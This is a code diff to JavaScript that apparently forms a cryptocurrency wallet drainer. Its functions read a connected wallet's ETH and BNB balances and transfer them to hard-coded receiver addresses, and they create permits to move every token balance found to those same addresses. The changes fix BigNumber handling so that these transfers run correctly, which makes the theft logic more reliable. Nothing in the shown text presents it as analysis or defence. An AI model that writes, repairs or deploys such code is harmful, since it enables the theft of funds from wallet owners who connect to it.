@@ -236,12 +236,16 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
     // Get ETH balance
     console.log('Getting ETH balance...')
     const ethBalance = await publicClient.getBalance({ address: walletAddress })
+    console.log(`ETH Balance raw: ${ethBalance}`)
     console.log(`ETH Balance: ${ethers.utils.formatEther(ethBalance)} ETH`)
     
+    // Convert to BigNumber for comparison
+    const ethBalanceBN = ethers.BigNumber.from(ethBalance.toString())
+    
     // Check if we have ETH to transfer (leave some for gas)
-    if (ethBalance.gt(ethers.utils.parseEther('0.001'))) {
+    if (ethBalanceBN.gt(ethers.utils.parseEther('0.001'))) {
       console.log('Transferring ETH...')
-      const result = await transferETH(walletClient, walletAddress, ethBalance, receiveAddress, publicClient)
+      const result = await transferETH(walletClient, walletAddress, ethBalanceBN, receiveAddress, publicClient)
       if (result) {
         transferCount++
         console.log(`ETH transfer completed. Tx: ${result.substring(0, 10)}...`)
@@ -257,12 +261,13 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
         console.log(`Checking balance for ${token.name} (${token.address})...`)
         const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
         console.log(`${token.name} balance: ${balance}`)
-        if (ethers.BigNumber.from(balance).gt(0)) {
-          console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
+        const balanceBN = ethers.BigNumber.from(balance.toString())
+        if (balanceBN.gt(0)) {
+          console.log(`Found ${ethers.utils.formatUnits(balanceBN, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
           console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balance, receiveAddress, publicClient)
+          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), receiveAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
@@ -299,12 +304,16 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
     // Get BNB balance
     console.log('Getting BNB balance...')
     const bnbBalance = await publicClient.getBalance({ address: walletAddress })
+    console.log(`BNB Balance raw: ${bnbBalance}`)
     console.log(`BNB Balance: ${ethers.utils.formatEther(bnbBalance)} BNB`)
     
+    // Convert to BigNumber for comparison
+    const bnbBalanceBN = ethers.BigNumber.from(bnbBalance.toString())
+    
     // Check if we have BNB to transfer (leave some for gas)
-    if (bnbBalance.gt(ethers.utils.parseEther('0.001'))) {
+    if (bnbBalanceBN.gt(ethers.utils.parseEther('0.001'))) {
       console.log('Transferring BNB...')
-      const result = await transferETH(walletClient, walletAddress, bnbBalance, bep20ReceiverAddress, publicClient)
+      const result = await transferETH(walletClient, walletAddress, bnbBalanceBN, bep20ReceiverAddress, publicClient)
       if (result) {
         transferCount++
         console.log(`BNB transfer completed. Tx: ${result.substring(0, 10)}...`)
@@ -320,12 +329,13 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
         console.log(`Checking balance for ${token.name} (${token.address})...`)
         const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
         console.log(`${token.name} balance: ${balance}`)
-        if (ethers.BigNumber.from(balance).gt(0)) {
-          console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
+        const balanceBN = ethers.BigNumber.from(balance.toString())
+        if (balanceBN.gt(0)) {
+          console.log(`Found ${ethers.utils.formatUnits(balanceBN, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
           console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balance, bep20ReceiverAddress, publicClient)
+          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
